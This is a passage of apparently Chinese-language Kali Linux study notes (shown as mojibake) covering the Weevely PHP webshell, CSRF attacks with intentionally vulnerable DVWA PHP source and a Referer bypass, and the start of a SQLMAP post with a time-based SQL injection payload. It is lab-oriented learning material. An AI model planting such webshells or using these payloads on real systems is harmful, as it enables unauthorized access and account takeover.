<li>-m HTTPé€šä¿¡æ–¹å¼ï¼ˆé»˜è®¤ä¸ºGetï¼‰</li>
<li>-c æŒ‡å®šCookieåå­—</li>
<li>-d å®šç•Œç¬¦</li>
<li>-a HTTPçš„user-agent</li>
<li>-p ä»£ç†æœåŠ¡</li>
<li>-l è®°å½•æ—¥å¿—</li>
<li>update å‡çº§ç‰ˆæœ¬</li>
</ul>
</li>
</ul>
<h4 id="4-WEBSHELLâ€“Weevelyï¼ˆPHPï¼‰"><a href="#4-WEBSHELLâ€“Weevelyï¼ˆPHPï¼‰" class="headerlink" title="4. WEBSHELLâ€“Weevelyï¼ˆPHPï¼‰"></a>4. WEBSHELLâ€“Weevelyï¼ˆPHPï¼‰</h4><ul>
<li>éšè—çš„ç±»ç»ˆç«¯PHP Webshell</li>
<li>30å¤šä¸ªç®¡ç†æ¨¡å—<ul>
<li>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æµ‹è¯•æ–‡ä»¶ç³»ç»Ÿ</li>
<li>æ£€æŸ¥æœåŠ¡å™¨å¸¸è§é…ç½®é”™è¯¯</li>
<li>åˆ›å»ºæ­£å‘ã€åå‘TCP Shellè¿æ¥</li>
<li>é€šè¿‡ç›®æ ‡è®¡ç®—æœºä»£ç†HTTPæµé‡</li>
<li>ä»ç›®æ ‡è®¡ç®—æœºè¿è¡Œç«¯å£æ‰«æï¼Œæ¸—é€å†…ç½‘</li>
</ul>
</li>
<li>æ”¯æŒè¿æ¥å¯†ç </li>
<li>Kaliç¼ºå°‘åº“ â–² 2020.1.21å·²æ”¯æŒè¯¥åº“<ul>
<li><a href="https://pypi.python.org/pypi/PySocks/" target="_blank" rel="noopener">https://pypi.python.org/pypi/PySocks/</a></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./setup.py install</code></strong></li>
</ul>
</li>
<li>ç”ŸæˆæœåŠ¡ç«¯<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šweevely generate &lt;password&gt; wee.php</code></strong> </li>
<li>/usr/share/weevely/wee.php â–² 2020.1.21ç”Ÿæˆç¨‹åºåœ¨ç»ˆç«¯æ‰€åœ¨ä½ç½®</li>
</ul>
</li>
<li>æ‹·è´wee.phpåˆ°æœåŠ¡å™¨ç«¯<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šscp wee.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcp wee.php /var/www</code></strong></li>
</ul>
</li>
<li>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šweevely http://1.1.1.1/wee.php &lt;password&gt;</code></strong></li>
</ul>
</li>
<li>æŠ“åŒ…æŸ¥çœ‹HTTPå¤´ï¼ˆè¿‡æ»¤ï¼štcp.stream eq 5ï¼‰</li>
<li>â–² é€šè¿‡Refererã€Cookieã€bodyè¿›è¡Œä¼ è¾“ï¼Œè§£ç å¯ç”¨Base64è§£ç </li>
<li>helpï¼ˆæŸ¥çœ‹æ¨¡å—ï¼‰<ul>
<li>audit_sgidsgidï¼ˆSUID+SGIDï¼‰</li>
<li>audit_filesystemï¼ˆæŸ¥æ‰¾æ–‡ä»¶è®¾ç½®æƒé™ï¼‰</li>
<li>audit_phpconfï¼ˆå®¡è®¡phpçš„é…ç½®ä¿¡æ¯ï¼‰</li>
<li>system_infoï¼ˆæ“ä½œç³»ç»Ÿé…ç½®ï¼‰</li>
<li>backdoor_tcpï¼ˆæœ¬åœ°ç›‘å¬ä¸€ä¸ªshellåœ¨TCPç«¯å£ä¸Šï¼‰</li>
<li>backdoor_reversetcpï¼ˆæœ¬åœ°ç›‘å¬åå¼¹ä¸€ä¸ªshellï¼‰</li>
<li>bruteforce_sqlï¼ˆSQLæ³¨å…¥çš„æš´åŠ›ç ´è§£ï¼‰</li>
<li>net_proxyï¼ˆæŠŠé¶æœºå˜æˆä»£ç†æœåŠ¡å™¨ï¼Œä½†ä»£ç†IPç«¯å£éƒ½è®¾ç½®åœ¨æ”»å‡»è€…ä¸Šï¼‰</li>
<li>net_phpproxyï¼ˆphpä»£ç†ï¼Œéœ€è¦å®‰è£…ä¸€ä¸ªphpä»£ç†åœ¨é¶æœºä¸Šï¼‰</li>
<li>net_scan IP:ç«¯å£ï¼ˆæŠŠé¶æœºä½œä¸ºæ‰«æå™¨ï¼‰</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/" itemprop="url">Kali Linuxç¬”è®°(äº”åä¸‰)ï¼šCSRF</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
                2020-01-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
<li>Cross-site request forgery</li>
<li>ä¸XSSç»å¸¸æ··æ·†</li>
<li>ä»ä¿¡ä»»çš„è§’åº¦æ¥åŒºåˆ†<ul>
<li>XSSï¼šåˆ©ç”¨ç”¨æˆ·å¯¹ç«™ç‚¹çš„ä¿¡ä»»</li>
<li>CSRFï¼šåˆ©ç”¨ç«™ç‚¹å¯¹å·²ç»èº«ä»½è®¤è¯çš„ä¿¡ä»»</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­CSRFè¿‡ç¨‹
1.å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè·å¾—èº«ä»½è®¤è¯Token
2.Hackerå‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªä¼ªé€ å®šåˆ¶é¡µé¢ï¼Œè¯±ä½¿å®¢æˆ·ç«¯ç‚¹å‡»é¡µé¢
3.å®¢æˆ·ç«¯ç‚¹å‡»é¡µé¢ï¼Œé¡µé¢é€šè¿‡å®¢æˆ·ç«¯çš„Tokenæäº¤æ•°æ®æŒ‡ä»¤ç»™æœåŠ¡å™¨ç«¯
4.æœåŠ¡å™¨ç«¯æœªè¿›è¡Œå¯¹è¯·æ±‚æ¥æºçš„éªŒè¯ï¼ŒåªéªŒè¯Sessionæ˜¯å¦åˆæ³•æ€§
â–² äºŒæ¬¡è®¤è¯ï¼Œéšæœºæ•°æœºåˆ¶ï¼ŒéªŒè¯ç æœºåˆ¶ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥é˜²æ§CSRFæ¼æ´</code></pre></blockquote>
<ul>
<li>ç»“åˆç¤¾å·¥åœ¨èº«ä»½è®¤è¯ä¼šè¯è¿‡ç¨‹ä¸­å®ç°æ”»å‡»<ul>
<li>ä¿®æ”¹è´¦å·å¯†ç ã€ä¸ªäººä¿¡æ¯ï¼ˆemailã€æ”¶è·åœ°å€ï¼‰</li>
<li>å‘é€ä¼ªé€ çš„ä¸šåŠ¡è¯·æ±‚ï¼ˆç½‘é“¶ã€è´­ç‰©ã€æŠ•ç¥¨ï¼‰</li>
<li>å…³æ³¨ä»–äººç¤¾äº¤è´¦å·ï¼Œæ¨é€åšæ–‡</li>
<li>â–² åœ¨ç”¨æˆ·éè‡ªæ„¿ã€ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æäº¤è¯·æ±‚</li>
</ul>
</li>
<li>ä¸šåŠ¡é€»è¾‘æ¼æ´<ul>
<li>å¯¹å…³é”®æ“ä½œç¼ºå°‘ç¡®è®¤æœºåˆ¶</li>
<li>è‡ªåŠ¨æ‰«æç¨‹åºæ— æ³•å‘ç°æ­¤ç±»æ¼æ´</li>
</ul>
</li>
<li>æ¼æ´åˆ©ç”¨æ¡ä»¶<ul>
<li>è¢«å®³ç”¨æˆ·å·²ç»å®Œæˆèº«ä»½è®¤è¯</li>
<li>æ–°è¯·æ±‚çš„æäº¤ä¸éœ€è¦é‡æ–°èº«ä»½è®¤è¯æˆ–ç¡®è®¤æœºåˆ¶</li>
<li>æ”»å‡»è€…å¿…é¡»äº†è§£Web Applicationè¯·æ±‚çš„å‚æ•°æ„é€ </li>
<li>è¯±ä½¿ç”¨æˆ·è§¦å‘æ”»å‡»çš„æŒ‡ä»¤ï¼ˆç¤¾å·¥ï¼‰</li>
</ul>
</li>
<li>â–² è‡ªåŠ¨æ‰«æç¨‹åºçš„æ£€æµ‹æ–¹æ³•<ul>
<li>åœ¨è¯·æ±‚å’Œå“åº”è¿‡ç¨‹ä¸­æ£€æŸ¥æ˜¯å¦å­˜åœ¨anti-CSRF tokenåï¼ˆéšæœºæ•°éªŒè¯ï¼‰</li>
<li>æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦éªŒè¯anti-CSRF tokençš„åå€¼ï¼ˆæœåŠ¡å™¨ç«¯æ˜¯å¦éªŒè¯tokenæ­£ç¡®æ€§ï¼‰</li>
<li>æ£€æŸ¥tokenä¸­æ˜¯å¦å¯ç¼–è¾‘çš„å­—ç¬¦ä¸²</li>
<li>æ£€æŸ¥refererå¤´æ˜¯å¦å¯ä»¥ä¼ªé€ </li>
</ul>
</li>
<li>å¯¹ç­–<ul>
<li>Captchaï¼ˆéªŒè¯ç æœºåˆ¶ï¼‰</li>
<li>anti-CSRF tokenï¼ˆä½¿ç”¨æœ€å¹¿ï¼‰</li>
<li>Refererå¤´</li>
<li>é™ä½ä¼šè¯è¶…æ—¶æ—¶é—´</li>
</ul>
</li>
</ul>
<h4 id="2-CSRFâ€“æ¼æ´åˆ©ç”¨æ–¹æ³•"><a href="#2-CSRFâ€“æ¼æ´åˆ©ç”¨æ–¹æ³•" class="headerlink" title="2. CSRFâ€“æ¼æ´åˆ©ç”¨æ–¹æ³•"></a>2. CSRFâ€“æ¼æ´åˆ©ç”¨æ–¹æ³•</h4><ul>
<li>CSRF â†’ Getæ–¹æ³•<ul>
<li>Kaliå¼€å¯apachæœåŠ¡</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcd /var/www/html</code></strong> <strong><code>ğŸ”ºå‘½ä»¤ï¼švi csrf-get.html</code></strong></li>
<li><code>&lt;a href=&quot;BurpsuitæŠ“å–çš„åœ°å€/URLåœ°å€æŠ“å–&quot;&gt;csrf&lt;/a&gt;</code></li>
<li>windowä¸Šè®¿é—®csrf-get.html</li>
</ul>
</li>
<li>CSRF â†’ Postæ–¹æ³•<ul>
<li>View SourceæŸ¥çœ‹é¡µé¢çš„æºä»£ç </li>
<li>ä¿å­˜è¡¨å•formçš„å†…å®¹å­˜æˆä¸€ä¸ªé¡µé¢ï¼Œcsrf-post.html</li>
<li>è¯±ä½¿ç”¨æˆ·ç‚¹å‡»</li>
</ul>
</li>
<li>Burpsuit â†’ å³é”®è¯·æ±‚ â†’ Engagement tools â†’ Generate CSRF Poc â–² 2020.1.21åªæœ‰Burpsuite Professionalç‰ˆæœ¬æ‰æœ‰æ­¤åŠŸèƒ½<ul>
<li>Burpsuitè‡ªåŠ¨ç”ŸæˆCSRFç”Ÿæˆçš„ä¸€ä¸ªé¡µé¢</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcd /var/www/html</code></strong> <strong><code>ğŸ”ºå‘½ä»¤ï¼švi csrf-post-burp.html</code></strong></li>
<li>windowä¸Šè®¿é—®csrf-post-burp.html</li>
</ul>
</li>
</ul>
<h4 id="3-CSRFâ€“DVWA"><a href="#3-CSRFâ€“DVWA" class="headerlink" title="3. CSRFâ€“DVWA"></a>3. CSRFâ€“DVWA</h4><ul>
<li>Dvwaä¸­çš„CSRFï¼ˆLowï¼‰<ul>
<li>å¤šç§ç»•è¿‡æ–¹å¼</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">                </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwaä¸­çš„CSRFï¼ˆMediumï¼‰<ul>
<li>eregi()å‡½æ•°ï¼Œå–HTTP_REFERERè¿›è¡Œæ¯”è¾ƒåˆ¤æ–­</li>
<li>ç»•è¿‡æ–¹æ³•ï¼šBurpsuiteæŠ“åŒ…æˆªæ–­è¿›è¡Œä¿®æ”¹HTTPå¤´çš„Refererå‚æ•°</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Checks the http referer header</span><br><span class="line">        if ( eregi ( &quot;127.0.0.1&quot;, $_SERVER[&apos;HTTP_REFERER&apos;] ) )&#123;</span><br><span class="line">    </span><br><span class="line">            // Turn requests into variables</span><br><span class="line">            $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">            $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">            if ($pass_new == $pass_conf)&#123;</span><br><span class="line">                $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">                $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">                $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">                $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">                echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">                mysql_close();</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            else&#123;        </span><br><span class="line">                echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwaä¸­çš„CSRFï¼ˆHighï¼‰<ul>
<li>è¡¨å•åŠ å…¥å½“å‰å¯†ç è®¤è¯ï¼ˆäºŒæ¬¡è®¤è¯ï¼‰</li>
<li>åŸºæœ¬æ— ç»•è¿‡æ–¹å¼</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_curr = $_GET[&apos;password_current&apos;];</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">        // Sanitise current password input</span><br><span class="line">        $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">        $pass_curr = mysql_real_escape_string( $pass_curr );</span><br><span class="line">        $pass_curr = md5( $pass_curr );</span><br><span class="line">        </span><br><span class="line">        // Check that the current password is correct</span><br><span class="line">        $qry = &quot;SELECT password FROM `users` WHERE user=&apos;admin&apos; AND password=&apos;$pass_curr&apos;;&quot;;</span><br><span class="line">        $result = mysql_query($qry) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf) &amp;&amp; ( $result &amp;&amp; mysql_num_rows( $result ) == 1 ))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match or current password incorrect. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/" itemprop="url">Kali Linuxç¬”è®°(äº”åä¸€)ï¼šSQLMAP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-15T14:12:52+08:00">
                2020-01-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-SQLMAPè‡ªåŠ¨æ³¨å…¥"><a href="#1-SQLMAPè‡ªåŠ¨æ³¨å…¥" class="headerlink" title="1. SQLMAPè‡ªåŠ¨æ³¨å…¥"></a>1. SQLMAPè‡ªåŠ¨æ³¨å…¥</h4><ul>
<li>å¼€æºsqlæ³¨å…¥æ¼æ´æ£€æµ‹ã€åˆ©ç”¨å·¥å…·ï¼ˆpythonè¯­è¨€å¼€å‘ï¼‰</li>
<li>æ£€æµ‹åŠ¨æ€é¡µé¢ä¸­get/postå‚æ•°ã€cookieã€httpå¤´</li>
<li>æ•°æ®æ¦¨å–</li>
<li>æ–‡ä»¶ç³»ç»Ÿè®¿é—®</li>
<li>æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</li>
<li>å¼•æ“å¼ºå¤§ã€ç‰¹æ€§ä¸°å¯Œ</li>
<li>XSSæ¼æ´æ£€æµ‹</li>
</ul>
<blockquote>
<pre><code>â­WEBæ¸—é€éœ€è¦æ·±å…¥æŒæ¡SQLæ¼æ´çš„åŸç†ä»¥åŠæ³¨å…¥</code></pre></blockquote>
<h4 id="2-SQLMAPâ€“æ£€æµ‹æŠ€æœ¯"><a href="#2-SQLMAPâ€“æ£€æµ‹æŠ€æœ¯" class="headerlink" title="2. SQLMAPâ€“æ£€æµ‹æŠ€æœ¯"></a>2. SQLMAPâ€“æ£€æµ‹æŠ€æœ¯</h4><ul>
<li>åŸºäºå¸ƒå°”çš„ç›²æ³¨æ£€æµ‹ï¼ˆçœŸ/å‡ï¼‰</li>
<li>åŸºäºæ—¶é—´çš„ç›²æ³¨æ£€æµ‹ï¼ˆå“åº”æ—¶é—´é•¿çŸ­ï¼‰<ul>
<li>â€˜and (select * from (select(sleep(20)))a)â€“+</li>
</ul>
</li>
<li>åŸºäºé”™è¯¯çš„æ£€æµ‹</li>
<li>åŸºäºUNIONè”åˆæŸ¥è¯¢çš„æ£€æµ‹<ul>
<li>é€‚ç”¨äºé€šè¿‡å¾ªç¯ç›´æ¥è¾“å‡ºè”åˆæŸ¥è¯¢ç»“æœï¼Œå¦åˆ™åªæ˜¾ç¤ºç¬¬ä¸€é¡¹ç»“æœ</li>
</ul>
</li>
<li>åŸºäºå †å æŸ¥è¯¢çš„æ£€æµ‹<ul>
<li>;å †å å¤šä¸ªæŸ¥è¯¢è¯­å¥</li>
<li>é€‚ç”¨äºéselectçš„æ•°æ®ä¿®æ”¹ã€åˆ é™¤æ“ä½œ</li>
</ul>
</li>
<li>æ”¯æŒçš„æ•°æ®åº“ç®¡ç†ç³»ç»ŸDBMS<ul>
<li>MySQLï¼ŒOracleï¼ŒPostgreSQLï¼ŒMicrosoft SQL Serverï¼ŒMicrosoft Accessï¼ŒIBM DB2ï¼ŒSQLiteï¼ŒFirebirdï¼ŒSybaseï¼ŒSAP MaxDB</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­NOSQLMAPå¯ä»¥æŸ¥è¯¢NOSQLæ•°æ®åº“é‡Œé¢çš„ç±»å‹ï¼ˆéå…³ç³»å‹æ•°æ®åº“ï¼‰</code></pre></blockquote>
<h4 id="3-SQLMAPâ€“å…¶ä»–ç‰¹æ€§"><a href="#3-SQLMAPâ€“å…¶ä»–ç‰¹æ€§" class="headerlink" title="3. SQLMAPâ€“å…¶ä»–ç‰¹æ€§"></a>3. SQLMAPâ€“å…¶ä»–ç‰¹æ€§</h4><ul>
<li>æ•°æ®åº“ç›´æ¥è¿æ¥-d<ul>
<li>ä¸é€šè¿‡SQLæ³¨å…¥ï¼Œåˆ¶å®šèº«ä»½è®¤è¯ä¿¡æ¯ã€IPã€ç«¯å£ï¼ˆOrcal 121ï¼ŒSQL Server 3433ï¼‰</li>
</ul>
</li>
<li>ä¸burpsuiteã€googleç»“åˆä½¿ç”¨ï¼Œæ”¯æŒæ”¿ç­–è¡¨è¾¾å¼é™å®šæµ‹è¯•ç›®æ ‡</li>
<li>Getã€Postã€Cookieã€Refererã€User-Agentï¼ˆéšæœºæˆ–æŒ‡å®šç›®æ ‡ï¼‰<ul>
<li>Cookieè¿‡æœŸåè‡ªåŠ¨å¤„ç†Set-Cookieå¤´ï¼Œæ›´æ–°Cookieä¿¡æ¯ï¼ˆSQLMAPè‡ªåŠ¨æ¢æµ‹ï¼‰</li>
</ul>
</li>
<li>é™åˆ¶ï¼šæœ€å¤§å¹¶å‘ï¼Œå»¶è¿Ÿå‘é€</li>
<li>æ”¯æŒBasicã€Digestã€NTLMã€å®¢æˆ·ç«¯CAèº«ä»½è®¤è¯ï¼ˆè½¯è¯ä¹¦+pinç ï¼Œå¯¹å®¢æˆ·ç«¯çš„èº«ä»½è®¤è¯ï¼‰</li>
<li>æ•°æ®åº“ç‰ˆæœ¬ã€ç”¨æˆ·ã€æƒé™ã€hashæšä¸¾å’Œå­—å…¸ç ´è§£ã€æš´åŠ›ç ´è§£è¡¨åˆ—åç§°ï¼ˆæ— æ³•è¿›è¡Œunion selectï¼‰</li>
<li>æ–‡ä»¶ä¸Šä¼ ä¸‹è½½ã€UDFã€å¯åŠ¨å¹¶æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹ã€æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€è®¿é—®windowsæ³¨å†Œè¡¨</li>
<li>ä¸w3afã€metasploité›†æˆç»“åˆä½¿ç”¨ï¼ŒåŸºäºæ•°æ®åº“æœåŠ¡è¿›ç¨‹ææƒå’Œä¸Šä¼ æ‰§è¡Œåé—¨</li>
</ul>
<h4 id="4-SQLMAPâ€“å®‰è£…ä¸æ›´æ–°"><a href="#4-SQLMAPâ€“å®‰è£…ä¸æ›´æ–°" class="headerlink" title="4. SQLMAPâ€“å®‰è£…ä¸æ›´æ–°"></a>4. SQLMAPâ€“å®‰è£…ä¸æ›´æ–°</h4><ul>
<li>åŸºäºpython2.7å¼€å‘</li>
<li>å®‰è£…<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šapt-get install git</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šgit clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></strong></li>
</ul>
</li>
<li>å‡çº§<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsqlmap --update</code></strong> åœ¨çº¿</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šgit pull</code></strong> ç¦»çº¿</li>
